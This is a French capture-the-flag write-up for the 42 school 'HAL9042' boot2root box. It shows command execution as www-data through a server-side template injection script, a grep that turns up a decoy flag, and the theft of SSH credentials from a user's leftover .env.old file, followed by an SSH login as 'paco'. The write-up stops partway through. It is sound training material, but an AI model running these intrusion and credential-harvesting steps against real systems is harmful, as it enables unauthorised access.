# WRITEUP 3 - Boot2Root - Privilege Escalation Details

## Contexte : Box HAL9042, sujet pedagogique de l'Ecole 42  

> **_NOTE:_** Nous exploiterons dans ce troisieme WriteUp les vulnerabilites exposes dans les 2 premiers pour realiser une privilege escalation. ([Write Up 1](../writeup1/write_up_1.md) && [Write Up 2](../writeup2/write_up_2.md)). Il est recommande d'en prendre connaissance avant de poursuivre.

Je ne detaillerai pas tous les steps d'enumeration utilisateur realisees dans le cadre de ce projet ici car il est possible d'en trouver les traces *(tenues a jour plus ou moins regulierement dans le [LOGBOOK](../utils/LOG_BOOK.md))*  
Toutefois on a une visu de l'escalade a realiser dans la description de l'appliance fournie avec le sujet :  
  
### USERS  

| Ordre | Utilisateur |     | Done ?|
|-------|-------------|-----|-------|
|   1   | www-data    | 💻  |   ✅ [Clic](./write_up_3.md#a-prendre-le-controle-sur-www-data) |
|   2   | paco        | 🔐  |   ✅  [Clic](./write_up_3.md#b-prendre-le-controle-sur-paco)|
|   3   | wil         | 🕵️  |   ❌  |
|   4   | sophie      | 🧠  |   ❌  |
|   5   | ol          | 🛡️  |   ❌  |
|   6   | root        | 👑  |   ❌  |

### FLAGS  
| Number | Flag                                             |
|--------|--------------------------------------------------|
|   1    |   FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}    |
|   2    |                                                  |
|   3    |                                                  |
|   4    |                                                  |
|   5    |                                                  |
|   6    |                                                  |
|   7    |                                                  |
|   8    |                                                  |
|   9    |                                                  |
|   10   |                                                  |

1. **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**
En utilisant la SSTI sur `/evaluate` avec les privileges`/var/www/hal9042` : 
```bash
./post_evaluate.sh "find /var/www/hal9042 -type f -exec grep -Hn '/flag' {} +"
```  
> **_NOTE:_** Parcours recursivement `/var/www/hal9042`, selectionne uniquement les fichier classiques, cherche `/flag` dans leur contenu, en affichant pour chaque occurence le fichier et le numero de ligne, en regroupant dans un grep.  

Output :
```
Project under evaluation: /var/www/hal9042/app.py:81:        &#34;Disallow: /flag\n&#34;
/var/www/hal9042/app.py:82:        &#34;Disallow: /flag.txt\n&#34;
/var/www/hal9042/app.py:92:@app.route(&#34;/flag&#34;)
/var/www/hal9042/app.py:93:@app.route(&#34;/flag.txt&#34;)
/var/www/hal9042/app.py:99:        &#34;The flags are not lying around in /flag.\n&#34;
```
Donc :  
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ curl http://10.0.2.2:5042/flag                                                
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}

HAL9042: I appreciate the optimism.
The flags are not lying around in /flag.
Did you really think it would be that easy?
(I logged this request. I log everything. It's mostly the only thing I do.)
```

Le resultat est le meme sur `http://10.0.2.2:5042/flag.txt`

2. 


## KILL CHAIN

### A. Prendre le controle sur `www-data`

Le controle sur le shell de www-data se prend via `SSTI (Server Side Template Rendering)` exposee dans le [Write Up 2](../writeup2/write_up_2.md).

L'utilisation du script maison `./post_evaluate.sh` permet d'executer des commandes depuis les privileges de cet utilisateur.

```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./post_evaluate.sh "whoami"                                                   
Project under evaluation: www-data
```

### B. Prendre le controle sur `paco`

1. L'enumeration de fichiers user nous permet de recuperer depuis `/home/paco/.env.old` ses credentials :
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./get_file.sh "/home/paco/.env.old"
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```  
2. L'enumeration de ports effectuee au debut du projet nous a permis de reperer le port `6060` comme port pour le service `ssh` : 
```bash
┌──(kali㉿kali)-[~]
└─$ ssh -p 6060 paco@10.0.2.2
paco@10.0.2.2's password: Pac0_H4L_dev!
paco@hal9042:~$
```  

### C. Prendre le controle sur `wil`

